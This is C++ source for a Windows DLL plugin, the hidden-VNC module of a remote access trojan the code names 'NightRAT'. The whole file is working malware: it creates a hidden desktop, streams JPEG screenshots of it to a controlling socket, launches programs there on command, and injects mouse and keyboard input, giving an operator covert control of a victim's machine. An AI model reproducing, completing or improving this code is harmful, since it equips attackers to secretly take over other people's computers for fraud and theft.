#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <gdiplus.h>
#include <objidl.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct MonitorFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_HVNC_FRAME = 0x06;
static const uint32_t MONITOR_FRAME_FORMAT_JPEG = 1;

static atomic_bool g_hvncRunning(false);
static thread g_hvncThread;
static mutex g_sendMutex;
static HDESK g_hHiddenDesk = NULL;
static wstring g_desktopName = L"NightRAT_HVNC";
static ULONG_PTR g_gdiplusToken = 0;
static int g_quality = 50;

static bool safe_send_raw(SOCKET sock, const string& data) {
    const char* ptr = data.c_str();
    int remaining = (int)data.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static bool safe_send_json(SOCKET sock, const json& data) {
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump() + "\r\n";
    return safe_send_raw(sock, serialized);
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0, size = 0;
    GetImageEncodersSize(&count, &size);
    if (size == 0) return -1;
    vector<BYTE> buffer(size);
    ImageCodecInfo* codecs = (ImageCodecInfo*)buffer.data();
    GetImageEncoders(count, size, codecs);
    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return i;
        }
    }
    return -1;
}

static bool bitmap_to_jpeg(HBITMAP hBmp, ULONG quality, vector<BYTE>& bytes) {
    CLSID clsid;
    if (get_encoder_clsid(L"image/jpeg", &clsid) == -1) return false;
    Bitmap bmp(hBmp, NULL);
    IStream* stream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &stream);
    EncoderParameters params;
    params.Count = 1;
    params.Parameter[0].Guid = EncoderQuality;
    params.Parameter[0].Type = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues = 1;
    params.Parameter[0].Value = &quality;
    if (bmp.Save(stream, &clsid, &params) != Ok) {
        stream->Release();
        return false;
    }
    STATSTG stat;
    stream->Stat(&stat, STATFLAG_NONAME);
    bytes.resize((size_t)stat.cbSize.QuadPart);
    LARGE_INTEGER li = {0};
    stream->Seek(li, STREAM_SEEK_SET, NULL);
    ULONG read;
    stream->Read(bytes.data(), (ULONG)bytes.size(), &read);
    stream->Release();
    return true;
}

static void hvnc_loop(SOCKET sock) {
    SetThreadDesktop(g_hHiddenDesk);
    while (g_hvncRunning) {
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        HBITMAP hBmp = CreateCompatibleBitmap(hdcScreen, w, h);
        HGDIOBJ hOld = SelectObject(hdcMem, hBmp);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

        vector<BYTE> jpegBytes;
        if (bitmap_to_jpeg(hBmp, g_quality, jpegBytes)) {
            MonitorFrameHeader fh = {0};
            fh.width = w; fh.height = h; fh.format = MONITOR_FRAME_FORMAT_JPEG; fh.dataSize = (uint32_t)jpegBytes.size();
            PacketHeader ph = {PACKET_SIGNATURE, PACKET_TYPE_HVNC_FRAME, (uint32_t)(sizeof(fh) + jpegBytes.size())};

            lock_guard<mutex> lock(g_sendMutex);
            send(sock, (char*)&ph, sizeof(ph), 0);
            send(sock, (char*)&fh, sizeof(fh), 0);
            send(sock, (char*)jpegBytes.data(), (int)jpegBytes.size(), 0);
        }

        SelectObject(hdcMem, hOld);
        DeleteObject(hBmp);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Sleep(100);
    }
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json cmd = json::parse(commandJson);
        string action = cmd.value("action", "");

        if (action == "hvnc_start") {
            g_quality = cmd.value("quality", 50);
            if (!g_hHiddenDesk) {
                // Permissions without DESKTOP_SWITCHDESKTOP as per requirements
                g_hHiddenDesk = CreateDesktopW(g_desktopName.c_str(), NULL, NULL, 0,
                    DESKTOP_CREATEWINDOW | DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS |
                    DESKTOP_READOBJECTS | DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD |
                    DESKTOP_JOURNALPLAYBACK | STANDARD_RIGHTS_REQUIRED, NULL);
            }
            if (!g_hvncRunning) {
                g_hvncRunning = true;
                if (g_hvncThread.joinable()) g_hvncThread.join();
                g_hvncThread = thread(hvnc_loop, sock);
                safe_send_json(sock, {{"action", "hvnc_status"}, {"status", "HVNC Started"}});
            }
        }
        else if (action == "hvnc_stop") {
            g_hvncRunning = false;
            if (g_hvncThread.joinable()) g_hvncThread.join();
            safe_send_json(sock, {{"action", "hvnc_status"}, {"status", "HVNC Stopped"}});
        }
        else if (action == "hvnc_run") {
            string path = cmd.value("path", "");
            if (path.empty()) return;

            wstring wpath(path.begin(), path.end());
            STARTUPINFOW si = {sizeof(si)};
            si.lpDesktop = (LPWSTR)g_desktopName.c_str();
            PROCESS_INFORMATION pi = {0};
            if (CreateProcessW(NULL, (LPWSTR)wpath.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                safe_send_json(sock, {{"action", "hvnc_status"}, {"status", "Started: " + path}});
            } else {
                safe_send_json(sock, {{"action", "hvnc_error"}, {"error", "Failed to start: " + path}});
            }
        }
        else if (action == "hvnc_input") {
            string event = cmd.value("event", "");
            SetThreadDesktop(g_hHiddenDesk);

            if (event == "move" || event == "down" || event == "up") {
                int x = cmd.value("x", 0);
                int y = cmd.value("y", 0);
                int button = cmd.value("button", 0);

                INPUT input = {0};
                input.type = INPUT_MOUSE;
                input.mi.dx = x;
                input.mi.dy = y;
                input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;

                if (event == "move") input.mi.dwFlags |= MOUSEEVENTF_MOVE;
                else if (event == "down") {
                    if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN;
                    else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN;
                    else input.mi.dwFlags |= MOUSEEVENTF_MIDDLEDOWN;
                }
                else if (event == "up") {
                    if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTUP;
                    else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTUP;
                    else input.mi.dwFlags |= MOUSEEVENTF_MIDDLEUP;
                }
                SendInput(1, &input, sizeof(INPUT));
            }
            else if (event == "key_down" || event == "key_up") {
                int vk = cmd.value("key", 0);
                INPUT input = {0};
                input.type = INPUT_KEYBOARD;
                input.ki.wVk = (WORD)vk;
                if (event == "key_up") input.ki.dwFlags = KEYEVENTF_KEYUP;
                SendInput(1, &input, sizeof(INPUT));
            }
        }
    } catch (...) {}
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        GdiplusStartupInput gsi;
        GdiplusStartup(&g_gdiplusToken, &gsi, NULL);
    }
    else if (reason == DLL_PROCESS_DETACH) {
        g_hvncRunning = false;
        if (g_hvncThread.joinable()) g_hvncThread.join();
        if (g_gdiplusToken) GdiplusShutdown(g_gdiplusToken);
        if (g_hHiddenDesk) CloseDesktop(g_hHiddenDesk);
    }
    return TRUE;
}
